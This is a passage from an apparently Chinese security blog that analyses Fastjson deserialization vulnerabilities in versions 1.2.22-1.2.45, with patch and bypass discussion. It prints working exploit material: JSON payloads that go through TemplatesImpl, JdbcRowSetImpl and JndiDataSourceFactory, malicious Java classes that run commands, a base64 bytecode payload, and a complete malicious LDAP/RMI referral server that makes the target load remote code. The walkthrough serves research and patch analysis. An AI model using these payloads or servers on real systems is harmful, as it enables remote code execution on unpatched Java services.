解析完返回的类名是”[com.sun.rowset.JdbcRowSetImpl”，通过checkAutoType()函数检测之后，到后面就是读该类进行反序列化了： 在反序列化中，调用了DefaultJSONParser.parseArray()函数来解析数组内容，其中会有一些if判断语句校验后面的字符内容是否为”[“、”{“等，前面一开始尝试的几个payload报错的原因正是出在这里： 把这些条件一一满足后，就能成功利用了。 0x05 1.2.25-1.2.45补丁绕过绕过利用前提条件：需要目标服务端存在mybatis的jar包，且版本需为3.x.x系列&lt;3.5.0的版本。 直接给出payload，要连LDAP或RMI都可以： 1&#123;\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":&#123;\"data_source\":\"ldap://localhost:1389/Exploit\"&#125;&#125; 关键PoC：org.apache.ibatis.datasource.jndi.JndiDataSourceFactory 主要就是黑名单绕过，这个类我们在哈希黑名单中1.2.46的版本中可以看到： version hash hex-hash name 1.2.46 -8083514888460375884 0x8fd1960988bce8b4L org.apache.ibatis.datasource 运行即可成功触发： 调试分析调试checkAutoType()函数，看到对前一个补丁绕过方法的”[“字符进行了过滤，只要类名以”[“开头就直接抛出异常： 后面由于”org.apache.ibatis.datasource.jndi.JndiDataSourceFactory”不在黑名单中，因此能成功绕过checkAutoType()函数的检测。 继续往下调试分析org.apache.ibatis.datasource.jndi.JndiDataSourceFactory这条利用链的原理。 由于payload中设置了properties属性值，且JndiDataSourceFactory.setProperties()方法满足之前说的Fastjson会自动调用的setter方法的条件，因此可被利用来进行Fastjson反序列化漏洞的利用。 直接在该setter方法打断点，可以看到会调用到这来，这里就是熟悉的JNDI注入漏洞了，即InitialContext.lookup()，其中参数由我们输入的properties属性中的data_source值获取的： 之后就是由JNDI注入漏洞成功触发Fastjson反序列化漏洞了。 函数调用栈如下： 123456789101112131415161718192021222324&lt;init&gt;:10, ExploitnewInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)newInstance:57, NativeConstructorAccessorImpl (sun.reflect)newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)newInstance:526, Constructor (java.lang.reflect)newInstance:383, Class (java.lang)getObjectFactoryFromReference:163, NamingManager (javax.naming.spi)getObjectInstance:188, DirectoryManager (javax.naming.spi)c_lookup:1086, LdapCtx (com.sun.jndi.ldap)p_lookup:544, ComponentContext (com.sun.jndi.toolkit.ctx)lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)lookup:203, GenericURLContext (com.sun.jndi.toolkit.url)lookup:94, ldapURLContext (com.sun.jndi.url.ldap)lookup:411, InitialContext (javax.naming)setProperties:56, JndiDataSourceFactory (org.apache.ibatis.datasource.jndi)deserialze:-1, FastjsonASMDeserializer_1_JndiDataSourceFactory (com.alibaba.fastjson.parser.deserializer)deserialze:267, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)parseObject:384, DefaultJSONParser (com.alibaba.fastjson.parser)parse:1356, DefaultJSONParser (com.alibaba.fastjson.parser)parse:1322, DefaultJSONParser (com.alibaba.fastjson.parser)parse:152, JSON (com.alibaba.fastjson)parse:162, JSON (com.alibaba.fastjson)parse:131, JSON (com.alibaba.fastjson)main:8, JdbcRowSetImplPoc OK，Fastjson历史版本补丁的绕过大致就这些，并且这些都是需要开启AutoTypeSupport才能成功利用的，后面一篇文章就是讲2019年Fastjson反序列化漏洞，一样是checkAutoType()的绕过，但是无需开启AutoTypeSupport。","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"}]},{"title":"Fastjson系列二——1.2.22-1.2.24反序列化漏洞","date":"2019-11-07T13:20:04.000Z","path":"2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/","text":"0x01 影响版本Fastjson 1.2.x系列的1.2.22-1.2.24版本。 0x02 复现对于Fastjson 1.2.22-1.2.24 版本的反序列化漏洞的利用，目前已知的主要有以下的利用链： 基于TemplateImpl； 基于JNDI（又分为基于Bean Property类型和Field类型）； 需要的jar包我本地用的是fastjson-1.2.24.jar，commons-codec-1.12.jar，commons-io-2.5.jar，另外基于JdbcRowSetImpl调用链的利用还需要unboundid-ldapsdk-4.0.9.jar。 基于TemplateImpl的利用链这部分代码参考的廖新喜大佬的博客。 限制需要设置Feature.SupportNonPublicField进行反序列化操作才能成功触发利用。 复现利用恶意类Test.java，用于弹计算器，至于为啥需要继承AbstractTranslet类在后面的调试分析中会具体看到： 1234567891011121314public class Test extends AbstractTranslet &#123; public Test() throws IOException &#123; Runtime.getRuntime().exec(\"calc\"); &#125; @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) &#123; &#125; @Override public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException &#123; &#125; public static void main(String[] args) throws Exception &#123; Test t = new Test(); &#125;&#125; PoC.java，Fastjson反序列化漏洞点，Feature.SupportNonPublicField必须设置，readClass()方法用于将恶意类的二进制数据进行Base64编码，至于为何要进行编码在后面会讲到： 123456789101112131415161718192021222324252627282930public class PoC &#123; public static String readClass(String cls)&#123; ByteArrayOutputStream bos = new ByteArrayOutputStream(); try &#123; IOUtils.copy(new FileInputStream(new File(cls)), bos); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; return Base64.encodeBase64String(bos.toByteArray()); &#125; public static void main(String args[])&#123; try &#123; ParserConfig config = new ParserConfig(); final String fileSeparator = System.getProperty(\"file.separator\"); final String evilClassPath = System.getProperty(\"user.dir\") + \"\\\\out\\\\production\\\\FJTest\\\\Test.class\"; String evilCode = readClass(evilClassPath); final String NASTY_CLASS = \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"; String text1 = \"&#123;\\\"@type\\\":\\\"\" + NASTY_CLASS + \"\\\",\\\"_bytecodes\\\":[\\\"\"+evilCode+\"\\\"],'_name':'a.b','_tfactory':&#123; &#125;,\\\"_outputProperties\\\":&#123; &#125;,\" + \"\\\"_name\\\":\\\"a\\\",\\\"_version\\\":\\\"1.0\\\",\\\"allowedProtocols\\\":\\\"all\\\"&#125;\\n\"; System.out.println(text1); Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField); //Object obj = JSON.parse(text1, Feature.SupportNonPublicField); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; 运行即可弹出计算器： 关键看输出的构造的PoC： 1&#123;\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"yv66vgAAADMANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAZMVGVzdDsBAApFeGNlcHRpb25zBwAsAQAJdHJhbnNmb3JtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7BwAtAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAXQHAC4BAApTb3VyY2VGaWxlAQAJVGVzdC5qYXZhDAAIAAkHAC8MADAAMQEABGNhbGMMADIAMwEABFRlc3QBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAHAAAAAAAEAAEACAAJAAIACgAAAEAAAgABAAAADiq3AAG4AAISA7YABFexAAAAAgALAAAADgADAAAACgAEAAsADQAMAAwAAAAMAAEAAAAOAA0ADgAAAA8AAAAEAAEAEAABABEAEgABAAoAAABJAAAABAAAAAGxAAAAAgALAAAABgABAAAADwAMAAAAKgAEAAAAAQANAA4AAAAAAAEAEwAUAAEAAAABABUAFgACAAAAAQAXABgAAwABABEAGQACAAoAAAA/AAAAAwAAAAGxAAAAAgALAAAABgABAAAAEgAMAAAAIAADAAAAAQANAA4AAAAAAAEAEwAUAAEAAAABABoAGwACAA8AAAAEAAEAHAAJAB0AHgACAAoAAABBAAIAAgAAAAm7AAVZtwAGTLEAAAACAAsAAAAKAAIAAAAUAAgAFQAMAAAAFgACAAAACQAfACAAAAAIAAEAIQAOAAEADwAAAAQAAQAiAAEAIwAAAAIAJA==\"],'_name':'a.b','_tfactory':&#123; &#125;,\"_outputProperties\":&#123; &#125;,\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"&#125; PoC中几个重要的Json键的含义： @type——指定的解析类，即com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl，Fastjson根据指定类去反序列化得到该类的实例，在默认情况下只会去反序列化public修饰的属性，在PoC中，_bytecodes和_name都是私有属性，所以想要反序列化这两个属性，需要在parseObject()时设置Feature.SupportNonPublicField； _bytecodes——是我们把恶意类的.class文件二进制格式进行Base64编码后得到的字符串； _outputProperties——漏洞利用链的关键会调用其参数的getOutputProperties()方法，进而导致命令执行； _tfactory:{}——在defineTransletClasses()时会调用getExternalExtensionsMap()，当为null时会报错，所以要对_tfactory设置； 调试分析下面我们直接在反序列化的那句代码上打上断点进行调试分析： 1Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField); 在JSON.parseObject()中会调用DefaultJSONParser.parseObject()，而DefaultJSONParser.parseObject()中调用了JavaObjectDeserializer.deserialze()函数进行反序列化： 跟进该函数，发现会返回去调用DefaultJSONParser.parse()函数： 继续调试，在DefaultJSONParser.parse()里是对JSON内容进行扫描，在switch语句中匹配上了”{“即对应12，然后对JSON数据调用DefaultJSONParser.parseObject()进行解析： 在DefaultJSONParser.parseObject()中，通过for语句循环解析JSON数据内容，其中skipWhitespace()函数用于去除数据中的空格字符，然后获取当前字符是否为双引号，是的话就调用scanSymbol()获取双引号内的内容，这里得到第一个双引号里的内容为”@type”： 往下调试，判断key是否为@type且是否关闭了Feature.DisableSpecialKeyDetect设置，通过判断后调用scanSymbol()获取到了@type对应的指定类com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl，并调用TypeUtils.loadClass()函数加载该类： 跟进去，看到如红框的两个判断语句代码逻辑，是判断当前类名是否以”[“开头或以”L”开头以”;”结尾，当然本次调试分析是不会进入到这两个逻辑，但是后面的补丁绕过中利用到了这两个条件判断，也就是说这两个判断条件是后面补丁绕过的漏洞点，值得注意： 往下看，通过ClassLoader.loadClass()加载到目标类后，然后将该类名和类缓存到Map中，最后返回该加载的类： 返回后，程序继续回到DefaultJSONParser.parseObject()中往下执行，在最后调用JavaBeanDeserializer.deserialze()对目标类进行反序列化： 跟进去，循环扫描解析，解析到key为_bytecodes时，调用parseField()进一步解析： 在parseField()中，会调用DefaultFieldDeserializer.parseField()对_bytecodes对应的内容进行解析： 跟进DefaultFieldDeserializer.parseField()函数中，解析出_bytecodes对应的内容后，会调用setValue()函数设置对应的值，这里value即为恶意类二进制内容Base64编码后的数据： FieldDeserializer.setValue()函数，看到是调用private byte[][] com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl._bytecodes的set方法来设置_bytecodes的值： 返回之后，后面也是一样的，循环处理JSON数据中的其他键值内容。 当解析到_outputProperties的内容时，看到前面的下划线被去掉了： 跟进该方法，发现会通过反射机制调用com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties()方法，可以看到该方法类型是Properties、满足之前我们得到的结论即Fastjson反序列化会调用被反序列化的类的某些满足条件的getter方法： 跟进去，在getOutputProperties()方法中调用了newTransformer().getOutputProperties()方法： 跟进TemplatesImpl.newTransformer()方法，看到调用了getTransletInstance()方法： 继续跟进去查看getTransletInstance()方法，可以看到已经解析到Test类并新建一个Test类实例，注意前面会先调用defineTransletClasses()方法来生成一个Java类（Test类）： 再往下就是新建Test类实例的过程，并调用Test类的构造函数： 再之后就是弹计算器了。 整个调试过程主要的函数调用栈如下： 1234567891011121314151617181920212223242526&lt;init&gt;:11, TestnewInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)newInstance:57, NativeConstructorAccessorImpl (sun.reflect)newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)newInstance:526, Constructor (java.lang.reflect)newInstance:383, Class (java.lang)getTransletInstance:408, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)newTransformer:439, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)getOutputProperties:460, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)invoke0:-1, NativeMethodAccessorImpl (sun.reflect)invoke:57, NativeMethodAccessorImpl (sun.reflect)invoke:43, DelegatingMethodAccessorImpl (sun.reflect)invoke:606, Method (java.lang.reflect)setValue:85, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)parseField:83, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)parseField:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)deserialze:188, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser)parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)deserialze:45, JavaObjectDeserializer (com.alibaba.fastjson.parser.deserializer)parseObject:639, DefaultJSONParser (com.alibaba.fastjson.parser)parseObject:339, JSON (com.alibaba.fastjson)parseObject:302, JSON (com.alibaba.fastjson)main:35, PoC 最后的调用过滤再具体说下：在getTransletInstance()函数中调用了defineTransletClasses()函数，在defineTransletClasses()函数中会根据_bytecodes来生成一个Java类（这里为恶意类Test），其构造方法中含有命令执行代码，生成的Java类随后会被newInstance()方法调用生成一个实例对象，从而该类的构造函数被自动调用，进而造成任意代码执行。 为什么恶意类需要继承AbstractTranslet类在前面的调试分析中，getTransletInstance()函数会先调用defineTransletClasses()方法来生成一个Java类，我们跟进这个defineTransletClasses()方法查看下： 可以看到有个逻辑会判断恶意类的父类类名是否是ABSTRACT_TRANSLET，是的话_transletIndex变量的值被设置为0，到后面的if判断语句中就不会被识别为&lt;0而抛出异常终止程序。 为什么需要对_bytecodes进行Base64编码可以发现，在PoC中的_bytecodes字段是经过Base64编码的。为什么要怎么做呢？分析Fastjson对JSON字符串的解析过程，原理Fastjson提取byte[]数组字段值时会进行Base64解码，所以我们构造payload时需要对_bytecodes字段进行Base64加密处理。 其中Fastjson的处理代码如下，在ObjectArrayCodec.deserialze()函数中会调用lexer.bytesValue()对byte数组进行处理： 123456789101112public &lt;T&gt; T deserialze(DefaultJSONParser parser, Type type, Object fieldName) &#123; final JSONLexer lexer = parser.lexer; if (lexer.token() == JSONToken.NULL) &#123; lexer.nextToken(JSONToken.COMMA); return null; &#125; if (lexer.token() == JSONToken.LITERAL_STRING) &#123; byte[] bytes = lexer.bytesValue(); lexer.nextToken(JSONToken.COMMA); return (T) bytes; &#125; 我们调试看看ObjectArrayCodec.deserialze()函数是在哪调用的，其实它的调用实在setValue()前面进行处理的： 跟进几层，看到调用栈就清楚了，实在ObjectArrayCodec.deserialze()函数中调用到的： 跟进bytesValue()函数，就是对_bytecodes的内容进行Base64解码： 为什么需要设置_tfactory为{}由前面的调试分析知道，在getTransletInstance()函数中调用了defineTransletClasses()函数，defineTransletClasses()函数是用于生成Java类的，在其中会新建一个转换类加载器，其中会调用到_tfactory.getExternalExtensionsMap()方法，若_tfactory为null则会导致这段代码报错、从而无法生成恶意类，进而无法成功攻击利用： 为什么反序列化调用getter方法时会调用到TemplatesImpl.getOutputProperties()方法getOutputProperties()方法是个无参数的非静态的getter方法，以get开头且第四个字母为大写形式，其返回值类型是Properties即继承自Map类型，满足之前文章《Fastjson系列一——反序列化漏洞基本原理》说的Fastjson反序列化时会调用的getter方法的条件，因此在使用Fastjson对TemplatesImpl类对象进行反序列化操作时会自动调用getOutputProperties()方法。 如何关联_outputProperties与getOutputProperties()方法Fastjson会语义分析JSON字符串，根据字段key，调用fieldList数组中存储的相应方法进行变量初始化赋值。 具体的代码在JavaBeanDeserializer.parseField()中，其中调用了smartMatch()方法： 1234public boolean parseField(DefaultJSONParser parser, String key, Object object, Type objectType, Map&lt;String, Object&gt; fieldValues) &#123; JSONLexer lexer = parser.lexer; // xxx FieldDeserializer fieldDeserializer = smartMatch(key); 在JavaBeanDeserializer.smartMatch()方法中，会替换掉字段key中的_，从而使得_outputProperties变成了outputProperties： 既然已经得到了outputProperties属性了，那么自然而然就会调用到getOutputProperties()方法了。 基于JdbcRowSetImpl的利用链基于JdbcRowSetImpl的利用链主要有两种利用方式，即JNDI+RMI和JNDI+LDAP，都是属于基于Bean Property类型的JNDI的利用方式。 关于JNDI注入的相关概念，可以参考之前的文章《浅析JNDI注入》。 限制由于是利用JNDI注入漏洞来触发的，因此主要的限制因素是JDK版本。 基于RMI利用的JDK版本&lt;=6u141、7u131、8u121，基于LDAP利用的JDK版本&lt;=6u211、7u201、8u191。 JNDI+RMI复现利用PoC如下，@type指向com.sun.rowset.JdbcRowSetImpl类，dataSourceName值为RMI服务中心绑定的Exploit服务，autoCommit有且必须为true或false等布尔值类型： 1&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\", \"autoCommit\":true&#125; JNDIServer.java，RMI服务，注册表绑定了Exploit服务，该服务是指向恶意Exploit.class文件所在服务器的Reference： 12345678910public class JNDIServer &#123; public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException &#123; Registry registry = LocateRegistry.createRegistry(1099); //http://127.0.0.1:8000/Exploit.class即可 Reference reference = new Reference(\"Exloit\", \"Exploit\",\"http://127.0.0.1:8000/\"); ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference); registry.bind(\"Exploit\",referenceWrapper); &#125;&#125; Exploit.java，恶意类，单独编译成class文件并放置于RMI服务指向的三方Web服务中，作为一个Factory绑定在注册表服务中： 12345678910111213141516public class Exploit&#123; public Exploit() &#123; try &#123; String[] cmds = System.getProperty(\"os.name\").toLowerCase().contains(\"win\") ? new String[]&#123;\"cmd.exe\",\"/c\", \"calc.exe\"&#125; : new String[]&#123;\"/bin/bash\",\"-c\", \"touch /tmp/hacked\"&#125;; Runtime.getRuntime().exec(cmds); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; public static void main(String[] args) &#123; Exploit e = new Exploit(); &#125;&#125; JdbcRowSetImplPoc.java： 123456public class JdbcRowSetImplPoc &#123; public static void main(String[] argv)&#123; String payload = \"&#123;\\\"@type\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\",\\\"dataSourceName\\\":\\\"rmi://localhost:1099/Exploit\\\", \\\"autoCommit\\\":true&#125;\"; JSON.parse(payload); &#125;&#125; 先运行JNDI的RMI服务，将恶意类Exploit.class单独放置于一个三方的Web服务中，然后运行PoC即可弹计算器，且看到访问了含有恶意类的Web服务： JNDI+LDAP复现利用PoC如下，跟RMI的相比只是改了URL而已： 1&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:1389/Exploit\", \"autoCommit\":true&#125; 但是相比RMI的利用方式，优势在于JDK的限制更低了。 LdapServer.java，区别在于将之前的RMI服务端换成LDAP服务端： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182public class LdapServer &#123; private static final String LDAP_BASE = \"dc=example,dc=com\"; public static void main (String[] args) &#123; String url = \"http://127.0.0.1:8000/#Exploit\"; int port = 1389; try &#123; InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE); config.setListenerConfigs(new InMemoryListenerConfig( \"listen\", InetAddress.getByName(\"0.0.0.0\"), port, ServerSocketFactory.getDefault(), SocketFactory.getDefault(), (SSLSocketFactory) SSLSocketFactory.getDefault())); config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url))); InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config); System.out.println(\"Listening on 0.0.0.0:\" + port); ds.startListening(); &#125; catch ( Exception e ) &#123; e.printStackTrace(); &#125; &#125; private static class OperationInterceptor extends InMemoryOperationInterceptor &#123; private URL codebase; /** * */ public OperationInterceptor ( URL cb ) &#123; this.codebase = cb; &#125; /** * &#123;@inheritDoc&#125; * * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult) */ @Override public void processSearchResult ( InMemoryInterceptedSearchResult result ) &#123; String base = result.getRequest().getBaseDN(); Entry e = new Entry(base); try &#123; sendResult(result, base, e); &#125; catch ( Exception e1 ) &#123; e1.printStackTrace(); &#125; &#125; protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException &#123; URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(\".class\")); System.out.println(\"Send LDAP reference result for \" + base + \" redirecting to \" + turl); e.addAttribute(\"javaClassName\", \"Exploit\"); String cbstring = this.codebase.toString(); int refPos = cbstring.indexOf('#'); if ( refPos &gt; 0 ) &#123; cbstring = cbstring.substring(0, refPos); &#125; e.addAttribute(\"javaCodeBase\", cbstring); e.addAttribute(\"objectClass\", \"javaNamingReference\"); e.addAttribute(\"javaFactory\", this.codebase.getRef()); result.sendSearchEntry(e); result.setResult(new LDAPResult(0, ResultCode.SUCCESS)); &#125; &#125;&#125; Exploit.java不变。 JdbcRowSetImplPoC.java中修改payload中的dataSourceName的值为指向LDAP服务端地址即可： 1String payload = \"&#123;\\\"@type\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\",\\\"dataSourceName\\\":\\\"ldap://localhost:1389/Exploit\\\", \\\"autoCommit\\\":true&#125;\"; 和RMI同样的利用方式，能成功弹计算器： 调试分析虽然前面两个复现利用是用的不同的服务，但是都是利用了com.sun.rowset.JdbcRowSetImpl这条利用链来触发的，漏洞点都是JNDI注入导致的。 在JSON.parse(payload);处打下断点开始往下调试。 前面的函数调用过程和基于TemplateImpl的调试分析几乎是一样的，只看下区别的地方。 调用scanSymbol()函数扫描到com.sun.rowset.JdbcRowSetImpl类后，再调用TypeUtils.loadClass()函数将该类加载进来： 往下调试，调用了FastjsonASMDeserializer.deserialze()函数对该类进行反序列化操作： 继续往下调试，就是ASM机制生成的临时代码了，这些代码是下不了断点、也看不到，直接继续往下调试即可。 由于PoC设置了dataSourceName键值和autoCommit键值，因此在JdbcRowSetImpl中的setDataSourceName()和setAutoCommit()函数都会被调用，因为它们均满足前面说到的Fastjson在反序列化时会自动调用的setter方法的特征。 先是调试到了setDataSourceName()函数，将dataSourceName值设置为目标RMI服务的地址： 接着调用到setAutoCommit()函数，设置autoCommit值，其中调用了connect()函数： 跟进connect()函数，看到了熟悉的JNDI注入的代码即InitialContext.lookup()，并且其参数是调用this.getDataSourceName()获取的、即在前面setDataSourceName()函数中设置的值，因此lookup参数外部可控，导致存在JNDI注入漏洞： 再往下就是JNDI注入的调用过程了，最后是成功利用JNDI注入触发Fastjson反序列化漏洞、达到任意命令执行效果。 调试过程的函数调用栈如下： 12345678910111213141516171819connect:654, JdbcRowSetImpl (com.sun.rowset)setAutoCommit:4081, JdbcRowSetImpl (com.sun.rowset)invoke0:-1, NativeMethodAccessorImpl (sun.reflect)invoke:57, NativeMethodAccessorImpl (sun.reflect)invoke:43, DelegatingMethodAccessorImpl (sun.reflect)invoke:606, Method (java.lang.reflect)setValue:96, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)parseField:83, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)parseField:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)parseRest:922, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)deserialze:-1, FastjsonASMDeserializer_1_JdbcRowSetImpl (com.alibaba.fastjson.parser.deserializer)deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser)parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser)parse:137, JSON (com.alibaba.fastjson)parse:128, JSON (com.alibaba.fastjson)main:6, JdbcRowSetImplPoc 一个小问题这里漏洞触发点是JSON.parse(payload);，改成用JSON.parse(payload);也是可以成功利用的。 为啥会这样呢？其实看到之前讲解的parse与parseObject区别就知道了。 我们将JSON.parse()换成JSON.parseObject()再调试一遍会发现，JSON.parseObject()会调用到JSON.parse()、再调用DefaultJSONParser.parse()，也就是说JSON.parseObject()本质上还是调用JSON.parse()进行反序列化的，区别不过是parseObject()会额外调用JSON.toJSON()来将Java对象专为JSONObject对象。两者的反序列化的操作时一样的，因此都能成功触发。 0x03 补丁分析这里下载1.2.25版本的jar包看下是怎么修补的。 checkAutoType()修补方案就是将DefaultJSONParser.parseObject()函数中的TypeUtils.loadClass替换为checkAutoType()函数： 看下checkAutoType()函数，具体的可看注释： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123; if (typeName == null) &#123; return null; &#125; final String className = typeName.replace('$', '.'); // autoTypeSupport默认为False // 当autoTypeSupport开启时，先白名单过滤，匹配成功即可加载该类，否则再黑名单过滤 if (autoTypeSupport || expectClass != null) &#123; for (int i = 0; i &lt; acceptList.length; ++i) &#123; String accept = acceptList[i]; if (className.startsWith(accept)) &#123; return TypeUtils.loadClass(typeName, defaultClassLoader); &#125; &#125; for (int i = 0; i &lt; denyList.length; ++i) &#123; String deny = denyList[i]; if (className.startsWith(deny)) &#123; throw new JSONException(\"autoType is not support. \" + typeName); &#125; &#125; &#125; // 从Map缓存中获取类，注意这是后面版本的漏洞点 Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName); if (clazz == null) &#123; clazz = deserializers.findClass(typeName); &#125; if (clazz != null) &#123; if (expectClass != null &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123; throw new JSONException(\"type not match. \" + typeName + \" -&gt; \" + expectClass.getName()); &#125; return clazz; &#125; // 当autoTypeSupport未开启时，先黑名单过滤，再白名单过滤，若白名单匹配上则直接加载该类，否则报错 if (!autoTypeSupport) &#123; for (int i = 0; i &lt; denyList.length; ++i) &#123; String deny = denyList[i]; if (className.startsWith(deny)) &#123; throw new JSONException(\"autoType is not support. \" + typeName); &#125; &#125; for (int i = 0; i &lt; acceptList.length; ++i) &#123; String accept = acceptList[i]; if (className.startsWith(accept)) &#123; clazz = TypeUtils.loadClass(typeName, defaultClassLoader); if (expectClass != null &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123; throw new JSONException(\"type not match. \" + typeName + \" -&gt; \" + expectClass.getName()); &#125; return clazz; &#125; &#125; &#125; if (autoTypeSupport || expectClass != null) &#123; clazz = TypeUtils.loadClass(typeName, defaultClassLoader); &#125; if (clazz != null) &#123; if (ClassLoader.class.isAssignableFrom(clazz) // classloader is danger || DataSource.class.isAssignableFrom(clazz) // dataSource can load jdbc driver ) &#123; throw new JSONException(\"autoType is not support. \" + typeName); &#125; if (expectClass != null) &#123; if (expectClass.isAssignableFrom(clazz)) &#123; return clazz; &#125; else &#123; throw new JSONException(\"type not match. \" + typeName + \" -&gt; \" + expectClass.getName()); &#125; &#125; &#125; if (!autoTypeSupport) &#123; throw new JSONException(\"autoType is not support. \" + typeName); &#125; return clazz;&#125; 简单地说，checkAutoType()函数就是使用黑白名单的方式对反序列化的类型继续过滤，acceptList为白名单（默认为空，可手动添加），denyList为黑名单（默认不为空）。 默认情况下，autoTypeSupport为False，即先进行黑名单过滤，遍历denyList，如果引入的库以denyList中某个deny开头，就会抛出异常，中断运行。 